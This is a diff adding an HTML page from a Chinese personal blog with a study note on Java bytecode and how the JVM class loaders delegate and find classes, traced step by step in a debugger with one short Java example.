@@ -1,0 +1,1192 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Suzen.jpg">
+  <link rel="icon" href="/img/Suzen.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="Suzen">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="学习文章：https:&#x2F;&#x2F;drun1baby.top&#x2F;2022&#x2F;06&#x2F;03&#x2F;Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD&#x2F;#0x04-%E5%8A%A8%E6%80%81%E5%8A%A0%E">
+<meta property="og:type" content="article">
+<meta property="og:title" content="动态加载字节码">
+<meta property="og:url" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/index.html">
+<meta property="og:site_name" content="Suzen">
+<meta property="og:description" content="学习文章：https:&#x2F;&#x2F;drun1baby.top&#x2F;2022&#x2F;06&#x2F;03&#x2F;Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD&#x2F;#0x04-%E5%8A%A8%E6%80%81%E5%8A%A0%E">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260108194431514.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113131734253.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113132002679.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113132203463.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113132849893.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113133208573.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113134041549.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113134141653.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113134644028.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113134825662.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113135154355.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113135707683.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113135846993.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113135319150.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113140415284.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113141340861.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113141515788.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126154054864.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125185010159.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125190059512.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125191536273.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125191914951.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125192700508.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125192826800.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125193321320.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125193548471.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125200327390.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125203211746.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125210320004.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126103943854.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126104012668.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126115034635.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126115331178.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126115452157.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126115553591.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126142140155.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126143138235.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126144246987.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126144646569.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126144805201.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126145354752.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126150349752.png">
+<meta property="og:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126151023499.png">
+<meta property="article:published_time" content="2026-01-26T07:54:44.000Z">
+<meta property="article:modified_time" content="2026-01-26T07:56:46.624Z">
+<meta property="article:author" content="Suzen">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://yschen20.github.io/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260108194431514.png">
+<meta name="twitter:creator" content="@Suzen">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>动态加载字节码 - Suzen</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassbg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yschen20.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-04-25T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+
+    
+
+<style type="text/css">
+  @keyframes spin3D {
+    from {
+      transform: rotate3d(0.5, 0.5, 0.5, 360deg);
+    }
+
+    to {
+      transform: rotate3d(0deg);
+    }
+  }
+
+  #loading {
+    height: 100%;
+    background-color: #172d4781;
+    backdrop-filter: saturate(100%) blur(10px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    overflow: hidden;
+    z-index: 99999999;
+  }
+
+  .spinner-box {
+    width: 300px;
+    height: 300px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: transparent;
+  }
+
+  .leo {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-radius: 50%;
+  }
+
+  .blue-orbit {
+    width: 175px;
+    height: 175px;
+    border: 2px solid #1a91fa;
+    animation: spin3D 3s linear .2s infinite;
+  }
+
+  .green-orbit {
+    width: 135px;
+    height: 135px;
+    border: 2px solid #00ffdd;
+    animation: spin3D 2s linear 0s infinite;
+  }
+
+  .red-orbit {
+    width: 100px;
+    height: 100px;
+    border: 2px solid #d75151;
+    animation: spin3D 1s linear 0s infinite;
+  }
+
+  .white-orbit-a {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 3s linear 0s infinite;
+  }
+
+  .white-orbit-b {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 1.5s linear 0s infinite;
+  }
+
+  .nucleus {
+    width: 1px;
+    height: 1px;
+    border: 1px solid #ffffff;
+    animation: spin3D 1s linear 0s infinite;
+  }
+</style>
+
+<div id="loading">
+    <div class="spinner-box">
+        <div class="blue-orbit leo"></div>
+        <div class="green-orbit leo"></div>
+        <div class="red-orbit leo"></div>
+        <div class="white-orbit-a leo"></div>
+        <div class="white-orbit-b leo"></div>
+        <div class="nucleus leo"></div>
+    </div>
+</div>
+
+<script>
+  (function () {
+    const loaded = function () {
+      window.onload = function () {
+        const loader = document.getElementById("loading");
+        loader.className = "fadeout";
+        setTimeout(function () {
+            loader.style.display = "none";
+          },
+                500
+        );
+      }
+    };
+    loaded();
+  })();
+</script>
+
+
+
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Suzen的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/2.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="动态加载字节码"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Suzen
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-26 15:54" pubdate>
+          2026年1月26日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          26 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">动态加载字节码</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2026-01-26T15:56:46+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>学习文章：<a target="_blank" rel="noopener" href="https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/#0x04-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81">https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/#0x04-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81</a></p>
+</blockquote>
+<h1 id="字节码的概念"><a href="#字节码的概念" class="headerlink" title="字节码的概念"></a>字节码的概念</h1><p>字节码是Java虚拟机（JVM）能够理解和执行的中间代码，它介于源代码和机器码之间</p>
+<blockquote>
+<p>严格来说，Java 字节码（ByteCode）其实仅仅指的是 Java 虚拟机执行使用的一类指令，通常被存储在<code>.class</code>文件中</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260108194431514.png" srcset="/img/loading.gif" lazyload alt="image-20260108194431514"></p>
+</blockquote>
+<h1 id="类加载器的原理"><a href="#类加载器的原理" class="headerlink" title="类加载器的原理"></a>类加载器的原理</h1><p>在<code>loadClass()</code>方法被调用的时候，是不进行类的初始化的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DynamicClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        c.loadClass(<span class="hljs-string">&quot;DynamicClassLoader.Person&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>在调用<code>loadClass</code>方法那里打断点进行调试</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113131734253.png" srcset="/img/loading.gif" lazyload alt="image-20260113131734253"></p>
+<p>找到智能步入跟进看代码</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113132002679.png" srcset="/img/loading.gif" lazyload alt="image-20260113132002679"></p>
+<p>会先走到<code>ClassLoader#loadClass()</code>，这里<code>return</code>一个<code>loadClass()</code>方法，并且第二个参数是<code>false</code></p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113132203463.png" srcset="/img/loading.gif" lazyload alt="image-20260113132203463"></p>
+<p>继续跟进会到<code>Launcher#loadClass</code></p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113132849893.png" srcset="/img/loading.gif" lazyload alt="image-20260113132849893"></p>
+<p>这里是一些判断安全的代码，最终会<code>return (super.loadClass(name, resolve));</code></p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113133208573.png" srcset="/img/loading.gif" lazyload alt="image-20260113133208573"></p>
+<p>继续跟进就会回到之前的<code>ClassLoader</code>类，下面就是双亲委派的过程</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113134041549.png" srcset="/img/loading.gif" lazyload alt="image-20260113134041549"></p>
+<p>这里<code>parent</code>这个属性是有的，不是<code>null</code>，是<code>ExtClassLoader</code>，所以会调用<code>ExtClassLoader#loadClass()</code></p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113134141653.png" srcset="/img/loading.gif" lazyload alt="image-20260113134141653"></p>
+<p>继续跟进还是会回到这个<code>ClassLoader#loadClass()</code>，因为<code>ExtClassLoader</code>没有<code>loadClass()</code>方法，所以会回来</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113134644028.png" srcset="/img/loading.gif" lazyload alt="image-20260113134644028"></p>
+<p>继续跟进后会发现<code>parent</code>是<code>null</code>，<code>null</code>的是因为<code>Bootstrap</code>类是<code>native</code>类，是用C写的源码，所以是<code>null</code>，然后就会调用<code>findBootstrapClassOrNull()</code>方法，但也是没有找到</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113134825662.png" srcset="/img/loading.gif" lazyload alt="image-20260113134825662"></p>
+<p>所以此时<code>c</code>是<code>null</code>，继续跟进会到<code>findClass()</code></p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113135154355.png" srcset="/img/loading.gif" lazyload alt="image-20260113135154355"></p>
+<p>去看<code>ClassLoader.findClass()</code>会发现没有写，是需要重写的一个方法</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113135707683.png" srcset="/img/loading.gif" lazyload alt="image-20260113135707683"></p>
+<p>所以就会继续走到此类的<code>findClass()</code>方法，当前是<code>ExtClassLoader</code>，就是会到它的</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113135846993.png" srcset="/img/loading.gif" lazyload alt="image-20260113135846993"></p>
+<p>但是继续跟进会走到<code>URLClassLoader#findClass()</code>，又突然多出一个<code>URLClassLoader</code>类</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113135319150.png" srcset="/img/loading.gif" lazyload alt="image-20260113135319150"></p>
+<p>这是因为<code>ExtClassLoader</code>和<code>AppClassLoader</code>里没有<code>findClass()</code>，并且这两个类的直接父类都是<code>URLClassLoader</code></p>
+<p>虽然在双亲委派模型中看起来这两个类不是平行关系，但实际上作为普通类来说，它们都是继承了父类<code>URLClassLoader</code>，是平行关系</p>
+<p>所以这里会跟进到<code>URLClassLoader#findClass()</code></p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113140415284.png" srcset="/img/loading.gif" lazyload alt="image-20260113140415284"></p>
+<p>这里就是加载不到，没有找到，就直接过了</p>
+<p>继续跟进就又回到<code>ClassLoader#loadClass()</code>，继续到<code>findClass()</code>这里，此时类是<code>AppClassLoader</code></p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113141340861.png" srcset="/img/loading.gif" lazyload alt="image-20260113141340861"></p>
+<p>继续跟进也是会进入到<code>URLClassLoader#findClass()</code></p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260113141515788.png" srcset="/img/loading.gif" lazyload alt="image-20260113141515788"></p>
+<p>继续跟进会调用到<code>defineClass()</code></p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126154054864.png" srcset="/img/loading.gif" lazyload alt="image-20260126154054864"></p>
+<p>再一步步跟进就是我们的 native 方法了</p>
+<p>总流程：</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript">	ClassLoader<br>-&gt;	SecureClassLoader<br>-&gt;	URLClassLoader<br>-&gt;	APPClassLoader<br>-&gt;	loadClass<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>	findClass()<br></code></pre></td></tr></table></figure>
+
